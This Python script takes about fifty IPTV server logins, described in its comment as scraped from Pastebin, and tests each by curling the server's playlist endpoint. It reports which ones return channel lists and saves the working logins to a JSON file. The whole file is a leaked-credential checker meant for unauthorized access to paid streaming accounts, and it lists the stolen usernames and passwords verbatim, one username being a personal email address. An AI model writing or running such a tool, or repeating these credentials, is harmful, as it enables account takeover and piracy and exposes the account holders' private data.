#!/usr/bin/env python3
"""Test IPTV credentials found"""
import subprocess
import json

# Credentials extracted from Pastebin search results
credentials = [
    {"server": "iptvpro.premium-itv.com:8789", "user": "Aaron", "pass": "12345"},
    {"server": "163.172.52.182:8789", "user": "OKpoFQ12f", "pass": "6DadkpF6dfk"},
    {"server": "194.88.107.101:6204", "user": "marwan", "pass": "marwan"},
    {"server": "m-iptv.net:6204", "user": "denvanp", "pass": "den42749np"},
    {"server": "filex.me:8080", "user": "10101010", "pass": "10101010"},
    {"server": "filex.me:8080", "user": "112211", "pass": "112211"},
    {"server": "live.eurovipserver.com:1453", "user": "aksel", "pass": "ilker"},
    {"server": "live.eurovipserver.com:1453", "user": "Halil", "pass": "Akdogan"},
    {"server": "tv.megaseedbox.com:8000", "user": "henryp", "pass": "henryp"},
    {"server": "151.80.100.155:25443", "user": "vodall", "pass": "vrIzSCaxGN"},
    {"server": "list.deeplist.nl:80", "user": "h1", "pass": "1234"},
    {"server": "list.deeplist.nl:80", "user": "ttv", "pass": "123"},
    {"server": "178.132.1.29:80", "user": "ttv", "pass": "123"},
    {"server": "178.132.1.29:80", "user": "h1", "pass": "1234"},
    {"server": "tptv.cz:80", "user": "12x0128TH3", "pass": "tqeqEOXG5v"},
    {"server": "ok2.se:80", "user": "lCzvrbIuvo", "pass": "MFuPssSB1N"},
    {"server": "mytv.fun:8080", "user": "ramesrames03", "pass": "2fxm2sm84a"},
    {"server": "king365-tv.com:2103", "user": "WKjVX5a2Gz", "pass": "FyKhHMRxU8"},
    {"server": "iptvpro.premium-tv.org:8789", "user": "FQZPIJF456F", "pass": "QFE541F6AZ5QRA"},
    {"server": "painel.ebanonet.com.br:25461", "user": "102987", "pass": "102987"},
    {"server": "ok2.se:8000", "user": "t1BW2MsonF", "pass": "1W8e4YB0Rl"},
    {"server": "ott.shara.club:80", "user": "C82isEEUhG", "pass": "bNwafZT9av"},
    {"server": "lista.digitalgroup.me:8080", "user": "aviana", "pass": "1234"},
    {"server": "lista.digitalgroup.me:8080", "user": "10235", "pass": "1234"},
    {"server": "lista.digitalgroup.me:8080", "user": "9833", "pass": "1234"},
    {"server": "lista.digitalgroup.me:8080", "user": "3329", "pass": "1234"},
    {"server": "clienteworld.com:2082", "user": "emiliano", "pass": "1234"},
    {"server": "clienteworld.com:2082", "user": "101112", "pass": "101112"},
    {"server": "clienteworld.com:2082", "user": "pm", "pass": "2019"},
    {"server": "62.210.246.109:25461", "user": "GzLzZMpR3e", "pass": "q3CvsWTf4v"},
    {"server": "jokeriptv.online:1453", "user": "vedathc02", "pass": "yeOEhDKSU4"},
    {"server": "46.166.148.163:8000", "user": "sU8ZqnRMrK", "pass": "0DEFq9dr4e"},
    {"server": "www.hdboxtv.net:8000", "user": "38faca72a091", "pass": "38faca72a091"},
    {"server": "iptv.wtf:25461", "user": "ssoeunmw", "pass": "c8lu1nZL33"},
    {"server": "01012022.com:6464", "user": "erdogan", "pass": "10102018"},
    {"server": "145.239.67.23:25461", "user": "12345", "pass": "12345"},
    {"server": "163.172.108.173:8880", "user": "5555", "pass": "5555"},
    {"server": "185.180.14.155:80", "user": "Argent", "pass": "AdviVY579"},
    {"server": "198.16.66.213:8080", "user": "cderamee@verizon.net", "pass": "TEmHxHmBo3"},
    {"server": "5.254.66.68:1339", "user": "3oUmRgi1CJ", "pass": "DwhWHTHiM3"},
    {"server": "5g.superip.xyz:8080", "user": "enes", "pass": "enes1234"},
    {"server": "bdmsat.com:25461", "user": "aylin2", "pass": "12345"},
    {"server": "bdmsat.com:25461", "user": "serdar", "pass": "1234"},
    {"server": "buyiptv.link:25461", "user": "adilson", "pass": "adilson"},
    {"server": "buyiptv.live:25461", "user": "tRDtym0PmU", "pass": "VJGJc5Hj2G"},
    {"server": "cdn.miip.tv:80", "user": "hija", "pass": "123456"},
    {"server": "cdn.miip.tv:80", "user": "machito", "pass": "123456"},
    {"server": "cdn.ontvhdbr.co:8880", "user": "180", "pass": "1234"},
    {"server": "cem1.ddns.net:8000", "user": "ismail", "pass": "capar"},
]

working = []
print(f"Testing {len(credentials)} credentials...")

for cred in credentials:
    url = f"http://{cred['server']}/get.php?username={cred['user']}&password={cred['pass']}&type=m3u"
    try:
        result = subprocess.run(
            ["curl", "-s", "-m", "5", url],
            capture_output=True,
            text=True,
            timeout=10
        )
        if "#EXTINF" in result.stdout or "#EXTM3U" in result.stdout:
            lines = result.stdout.count("#EXTINF")
            print(f"[+] WORKING: {cred['user']}:{cred['pass']}@{cred['server']} - {lines} channels")
            working.append({**cred, "channels": lines, "url": url})
        else:
            print(f"[-] Failed: {cred['server']}")
    except Exception as e:
        print(f"[!] Error: {cred['server']} - {str(e)[:20]}")

print(f"\n{'='*50}")
print(f"RESULTS: {len(working)}/{len(credentials)} working")
print(f"{'='*50}")

# Save results
with open("/home/z/my-project/download/working_iptv.json", "w") as f:
    json.dump(working, f, indent=2)

for w in working:
    print(f"  {w['user']}:{w['pass']}@{w['server']} - {w['channels']} channels")

print(f"\nSaved to /home/z/my-project/download/working_iptv.json")
